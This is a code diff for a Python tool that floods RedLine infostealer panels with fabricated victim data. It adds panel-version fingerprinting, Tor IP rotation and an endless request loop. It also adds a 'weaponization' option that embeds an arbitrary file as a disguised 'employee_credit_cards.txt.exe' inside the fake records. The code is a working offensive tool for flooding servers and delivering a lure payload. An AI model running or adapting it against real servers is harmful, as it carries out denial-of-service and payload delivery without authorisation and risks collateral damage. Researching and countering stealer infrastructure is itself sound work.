@@ -34,12 +34,17 @@ tor_password = "MyStr0n9P#D"
 class RedlineSettings:
     """MyClass class instance"""
 
-    def __init__(self, grabbrowsers, grabftp, grabfiles, grabimclients, grabpaths):
+    def __init__(self, grabbrowsers, grabftp, grabfiles, grabimclients, grabpaths, scanscreen, scansteam, scantelegram, scanvpn, scanwallets):
         self.grabbrowsers = grabbrowsers
         self.grabftp = grabftp
         self.grabfiles = grabfiles
         self.grabimclients = grabimclients
         self.grabpaths = grabpaths
+        self.scanscreen = scanscreen
+        self.scansteam = scansteam
+        self.scantelegram = scantelegram
+        self.scanvpn = scanvpn
+        self.scanwallets = scanwallets
 
 
 class ColorPrint:
@@ -122,30 +127,91 @@ def get_tor_session():
     session.proxies = {'http': 'socks5h://127.0.0.1:9050',
                        'https': 'socks5h://127.0.0.1:9050'}
     return session
-
-
-def get_settings(url):
+    
+    
+def get_panel_version(url):
+    version = "0.0"
     try:
         headers = {'Content-Type': 'text/xml; charset=utf-8',
                    'SOAPAction': 'http://tempuri.org/IRemotePanel/GetSettings'}
 
-        x = requests.post(url, headers=headers,
+        x = requests.post(url + "/IRemotePanel", headers=headers,
                           data='<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><GetSettings xmlns="http://tempuri.org/"/></s:Body></s:Envelope>')
-        print("Status code: " + str(x.status_code))
-        json_result = xmltodict.parse(x.text)
-        r = RedlineSettings(
-            json_result['s:Envelope']['s:Body']['GetSettingsResponse']['GetSettingsResult']['a:GrabBrowsers'],
-            json_result['s:Envelope']['s:Body']['GetSettingsResponse']['GetSettingsResult']['a:GrabFTP'],
-            json_result['s:Envelope']['s:Body']['GetSettingsResponse']['GetSettingsResult']['a:GrabFiles'],
-            json_result['s:Envelope']['s:Body']['GetSettingsResponse']['GetSettingsResult']['a:GrabImClients'],
-            json_result['s:Envelope']['s:Body']['GetSettingsResponse']['GetSettingsResult']['a:GrabPaths'])
-    except:
-        ColorPrint.print_fail("Unable to download config from " + url + " - Aborting")
-        exit()
+        if x.status_code == 200:
+            print("Version 2.1 detected")
+            version = "2.1"
+            return version
+    except Exception as e:
+        print(str(e))
+        
+    try:
+        print("Now checking for 2.2")
+        headers = {'Content-Type': 'text/xml; charset=utf-8',
+                   'SOAPAction': '"http://tempuri.org/Endpoint/CheckConnect"',
+                   'Expect': '100-continue',
+                   'Connection': 'Keep-Alive',
+                   'User-Agent': None}
+        x = requests.post(url, headers=headers, data='<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><CheckConnect xmlns="http://tempuri.org/"/></s:Body></s:Envelope>')
+        if x.status_code == 200:
+            print("Version 2.2 detected")
+            version = "2.2"
+            return version
+    except Exception as e:
+        print(str(e))
+        pass
+        
+    return version
+
+
+def get_settings(url, version):
+    if version == "2.1":
+        try:
+            headers = {'Content-Type': 'text/xml; charset=utf-8',
+                       'SOAPAction': 'http://tempuri.org/IRemotePanel/GetSettings'}
+
+            x = requests.post(url, headers=headers,
+                              data='<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><GetSettings xmlns="http://tempuri.org/"/></s:Body></s:Envelope>')
+            print("Status code: " + str(x.status_code))
+            json_result = xmltodict.parse(x.text)
+            r = RedlineSettings(
+                json_result['s:Envelope']['s:Body']['GetSettingsResponse']['GetSettingsResult']['a:GrabBrowsers'],
+                json_result['s:Envelope']['s:Body']['GetSettingsResponse']['GetSettingsResult']['a:GrabFTP'],
+                json_result['s:Envelope']['s:Body']['GetSettingsResponse']['GetSettingsResult']['a:GrabFiles'],
+                json_result['s:Envelope']['s:Body']['GetSettingsResponse']['GetSettingsResult']['a:GrabImClients'],
+                json_result['s:Envelope']['s:Body']['GetSettingsResponse']['GetSettingsResult']['a:GrabPaths'],
+                None, None, None, None, None)
+        except Exception as e:
+            ColorPrint.print_fail("Unable to download config from " + url + " - Aborting")
+            ColorPrint.print_fail(str(e))
+            exit()
+    elif version == "2.2":
+        try:
+            headers = {'Content-Type': 'text/xml; charset=utf-8',
+                       'SOAPAction': 'http://tempuri.org/Endpoint/EnvironmentSettings'}
+
+            x = requests.post(url, headers=headers,
+                              data='<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><EnvironmentSettings xmlns="http://tempuri.org/"/></s:Body></s:Envelope>')
+            print("Status code: " + str(x.status_code))
+            json_result = xmltodict.parse(x.text)
+            r = RedlineSettings(
+                json_result['s:Envelope']['s:Body']['EnvironmentSettingsResponse']['EnvironmentSettingsResult']['a:ScanBrowsers'],
+                json_result['s:Envelope']['s:Body']['EnvironmentSettingsResponse']['EnvironmentSettingsResult']['a:ScanFTP'],
+                json_result['s:Envelope']['s:Body']['EnvironmentSettingsResponse']['EnvironmentSettingsResult']['a:ScanFiles'],
+                None, # GrabImClients
+                json_result['s:Envelope']['s:Body']['EnvironmentSettingsResponse']['EnvironmentSettingsResult']['a:ScanFilesPaths'],
+                json_result['s:Envelope']['s:Body']['EnvironmentSettingsResponse']['EnvironmentSettingsResult']['a:ScanScreen'],
+                json_result['s:Envelope']['s:Body']['EnvironmentSettingsResponse']['EnvironmentSettingsResult']['a:ScanSteam'],
+                json_result['s:Envelope']['s:Body']['EnvironmentSettingsResponse']['EnvironmentSettingsResult']['a:ScanTelegram'],
+                json_result['s:Envelope']['s:Body']['EnvironmentSettingsResponse']['EnvironmentSettingsResult']['a:ScanVPN'],
+                json_result['s:Envelope']['s:Body']['EnvironmentSettingsResponse']['EnvironmentSettingsResult']['a:ScanWallets'])
+        except Exception as e:
+            ColorPrint.print_fail("Unable to download config from " + url + " - Aborting")
+            ColorPrint.print_fail(str(e))
+
     return r
 
 
-def build_payload(weaponization_path):
+def build_payload_21(weaponization_path):
     fake = Faker()
     countrycode = create_countrycode()
     country = pycountry.countries.get(alpha_2=countrycode)
@@ -156,7 +222,7 @@ def build_payload(weaponization_path):
         data = open(weaponization_path, "rb").read()
         base64_payload = base64.b64encode(data).decode('utf-8')
     else:
-        base64_payload = base64.b64encode(numpy.random.bytes(random.randint(50000,10000000))).decode('utf-8')
+        base64_payload = base64.b64encode(numpy.random.bytes(random.randint(50000,1000000))).decode('utf-8')
         
     payload = '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><SendClientInfo xmlns="http://tempuri.org/"><user xmlns:a="v1/Models" xmlns:i="http://www.w3.org/2001/XMLSchema-instance"><a:AdminPromptType>DimmedPromptForNonWindowsBinaries</a:AdminPromptType>'
     payload += '<a:BuildID>' + ''.join(
@@ -242,6 +308,131 @@ def build_payload(weaponization_path):
     payload += '<a:UserAgent>' + fake.user_agent() + '</a:UserAgent>'
     payload += '<a:Username>' + create_username() + '</a:Username>'
     payload += '</user></SendClientInfo></s:Body></s:Envelope>'
+    return payload
+    
+    
+def build_payload_22(weaponization_path):
+    fake = Faker()
+    countrycode = create_countrycode()
+    country = pycountry.countries.get(alpha_2=countrycode)
+    number_browsers = random.randint(1, 4)
+    base64_payload = ""
+    if ((weaponization_path != None) and (os.path.isfile(weaponization_path))):
+        print ("Using file " + weaponization_path + " to weaponize...")
+        data = open(weaponization_path, "rb").read()
+        base64_payload = base64.b64encode(data).decode('utf-8')
+    else:
+        base64_payload = base64.b64encode(numpy.random.bytes(random.randint(50000,1000000))).decode('utf-8')
+       
+    payload = '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><SetEnvironment xmlns="http://tempuri.org/">'
+    payload += '<user xmlns:a="BrowserExtension" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">'
+    payload += '<a:City>' + barnum.create_city_state_zip()[1] + '</a:City>'
+    payload += '<a:Country>' + countrycode + '</a:Country>'
+    payload += '<a:FileLocation>' + ''.join(
+                random.choices(string.ascii_uppercase + string.digits, k=random.randint(10, 34))) + '.exe</a:FileLocation>'  
+    payload += '<a:Hardware>' + uuid.uuid4().hex + '</a:Hardware>'
+    payload += '<a:IPv4>' + create_fakeip() + '</a:IPv4>'
+    payload += '<a:Language>' + country.name + ' (' + country.name + ')</a:Language>'
+    payload += '<a:MachineName>' + ''.join(
+                random.choices(string.ascii_uppercase + string.digits, k=random.randint(10, 34))) + '</a:MachineName>'
+    payload += '<a:Monitor>' + create_fake_screenshot() + '</a:Monitor>'
+    payload += '<a:OSVersion>' + create_windowsversion() + '</a:OSVersion>'
+    payload += '<a:ReleaseID>' + ''.join(
+                random.choices(string.ascii_uppercase + string.digits, k=random.randint(10, 34))) + '</a:ReleaseID>'
+    payload += '<a:ScanDetails>'
+    payload += '<a:AvailableLanguages xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays">'
+    payload += '<b:string>' + country.name + ' (' + country.name + ')</b:string>'  
+    payload += '</a:AvailableLanguages>'
+    
+    payload += '<a:Browsers>'
+    for i in range(number_browsers):
+        payload += '<a:ScannedBrowser>'
+        payload += '<a:Autofills>'
+        for r in range(random.randint(1, 10)):
+            payload += '<a:Autofill>'
+            payload += '<a:Name>' + create_username() + '</a:Name>'
+            payload += '<a:Value>' + create_username() + '</a:Value>'
+            payload += '</a:Autofill>'
+        payload += '</a:Autofills>'
+        payload += '<a:BrowserName>' + create_fake_browser() + '</a:BrowserName>'
+        payload += '<a:BrowserProfile>Default</a:BrowserProfile>'
+        payload += '<a:CC/>' # Credit Cards coming soon
+        payload += '<a:Cookies>'
+        for c in range(random.randint(50, 123)):
+            payload += '<a:Cookie>'
+            payload += '<a:Expires>0</a:Expires>'
+            payload += '<a:Host>' + fakeDomains[random.randint(0, len(fakeDomains) - 1)] + '</a:Host>'
+            payload += '<a:Http>false</a:Http>'
+            payload += '<a:Name>' + ''.join(
+                random.choices(string.ascii_uppercase + string.digits, k=random.randint(4, 27))) + '</a:Name>'
+            payload += '<a:Path>/</a:Path>'
+            payload += '<a:Secure>false</a:Secure>'
+            payload += '<a:Value>' + ''.join(
+                random.choices(string.ascii_uppercase + string.digits, k=random.randint(10, 34))) + '</a:Value>'
+            payload += '</a:Cookie>'
+        payload += '</a:Cookies>'
+        payload += '<a:Logins>'
+        for p in range(random.randint(7, 23)):
+            payload += '<a:Account>'
+            payload += '<a:Password>' + create_fakepassword() + '</a:Password>'
+            payload += '<a:URL>' + 'https://' + fakeDomains[random.randint(0, len(fakeDomains) - 1)] + '</a:URL>'
+            payload += '<a:Username>' + create_username() + "@" + fakeDomains[
+                random.randint(0, len(fakeDomains) - 1)] + '</a:Username>'            
+            payload += '</a:Account>'
+        payload += '</a:Logins>' 
+        payload += '</a:ScannedBrowser>'
+    payload += '</a:Browsers>'
+    payload += '<a:FtpConnections/>' # Coming soon
+    payload += '<a:GameChatFiles/>' # Coming soon
+    payload += '<a:GameLauncherFiles/>' # Coming soon
+    payload += '<a:InstalledBrowsers>'
+    for i in range(number_browsers):
+        browser = create_fake_browser()
+        payload += '<a:BrowserVersion>'
+        payload += '<a:NameOfBrowser>' + browser + '</a:NameOfBrowser>'
+        payload += '<a:PathOfFile>C:\Program Files\\' + browser + '\\' + browser + '.exe</a:PathOfFile>'
+        payload += '<a:Version>' + create_fakeversion() + '</a:Version>'
+        payload += '</a:BrowserVersion>'
+    payload += '</a:InstalledBrowsers>'
+    payload += '<a:MessageClientFiles/>' # Coming soon
+    payload += '<a:Nord/>'
+    payload += '<a:Open/>'
+    payload += '<a:Processes xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays">'
+    payload += create_fake_processes()    
+    payload += '</a:Processes>'
+    payload += '<a:Proton/>' # Coming soon
+    payload += '<a:ScannedFiles>'
+    payload += '<a:ScannedFile>'
+    payload += '<a:Body>' + base64_payload + '</a:Body>'
+    username = create_username()
+    payload += '<a:DirOfFile>Users\\' + username + '\\Desktop</a:DirOfFile>'
+    payload += '<a:NameOfFile>employee_credit_cards.txt.exe</a:NameOfFile>'
+    payload += '<a:PathOfFile>C:\\Users\\' + username + '\\Desktop\\employee_credit_cards.txt.exe</a:PathOfFile>'
+    payload += '</a:ScannedFile>'
+    payload += '</a:ScannedFiles>'
+    payload += '<a:ScannedWallets/>' # Coming soon
+    payload += '<a:SecurityUtils xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays"><b:string>Windows Defender</b:string></a:SecurityUtils>'
+    payload += '<a:Softwares xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays">'
+    for i in range(random.randint(15, 45)):
+        payload += '<b:string>' + create_fake_application() + '</b:string>'
+    payload += '</a:Softwares>'  
+    payload += '<a:SystemHardwares>'
+    payload += '<a:SystemHardware>'
+    payload += '<a:Counter>' + str(random.randint(1,32))+ '</a:Counter>'
+    payload += '<a:HardType>Processor</a:HardType>'
+    payload += '<a:Name>Intel(R) Core(TM) i' + str(random.randint(3, 9)) + '-' + str(random.randint(1000,10000)) + ' CPU @ ' + str(random.randint(1,4)) + '.' + str(random.randint(0,99)) + ' GHz</a:Name>'
+    payload += '</a:SystemHardware>' 
+    payload += '</a:SystemHardwares>'       
+    payload += '</a:ScanDetails>'
+    payload += '<a:ScreenSize>{Width=1690, Height=920}</a:ScreenSize>'
+    payload += '<a:SeenBefore>false</a:SeenBefore>'
+    payload += '<a:TimeZone>' + create_timezone() + '</a:TimeZone>'
+    payload += '<a:ZipCode>' + str(random.randint(100000, 999999))+ '</a:ZipCode>'
+    payload += '</user></SetEnvironment></s:Body></s:Envelope>'
+    
+    with open("Debug.txt", "w") as output:
+        output.write(payload)
+        
     return payload
 
 
@@ -358,16 +549,26 @@ def create_username():
     return glob_username
 
 
-def send_record(settings, url, use_tor, tor_session, weaponization_path):
+def send_record(settings, url, use_tor, tor_session, weaponization_path, version):    
     try:
-        headers = {'Content-Type': 'text/xml; charset=utf-8',
-                   'SOAPAction': 'http://tempuri.org/IRemotePanel/SendClientInfo'}
+        headers = None
+        if version == "2.1":
+            headers = {'Content-Type': 'text/xml; charset=utf-8',
+                       'SOAPAction': 'http://tempuri.org/IRemotePanel/SendClientInfo'}
+        elif version == "2.2":        
+            headers = {'Content-Type': 'text/xml; charset=utf-8',
+                       'SOAPAction': 'http://tempuri.org/Endpoint/SetEnvironment'}
+        contents = ""
+        if version == "2.1":
+            contents = build_payload_21(weaponization_path)
+        elif version == "2.2":
+            contents = build_payload_22(weaponization_path)
 
-        contents = build_payload(weaponization_path)
         if use_tor:
             x = tor_session.post(url, headers=headers, data=contents)
         else:
             x = requests.post(url, headers=headers, data=contents.encode('utf-8'))
+            print(x.text)
         return
     except Exception as e:
         ColorPrint.print_fail("Error while sending report! " + str(e))
@@ -469,7 +670,12 @@ if __name__ == '__main__':
             exit()
 
     if args.url:
-        r = get_settings(args.url)
+        version = get_panel_version(args.url)
+        if version == "0.0":
+            ColorPrint.print_fail("Could not determine panel version - aborting")
+            exit()
+            
+        r = get_settings(args.url, version)
 
         if args.report_count > 0:
             for i in range(args.report_count):
@@ -477,13 +683,13 @@ if __name__ == '__main__':
                 if args.use_tor:
                     if i % 50 == 0:
                         renew_tor_ip()
-                send_record(r, args.url, args.use_tor, tor_session, args.weaponization_path)
+                send_record(r, args.url, args.use_tor, tor_session, args.weaponization_path, version)
         else:
             counter = 0
             while 1 == 1:
                 print("Now sending item #" + str(counter))
                 if args.use_tor:
-                    if i % 50 == 0:
+                    if counter % 50 == 0:
                         renew_tor_ip()
-                send_record(r, args.url, args.use_tor, tor_session, args.weaponization_path)
+                send_record(r, args.url, args.use_tor, tor_session, args.weaponization_path, version)
                 counter = counter + 1
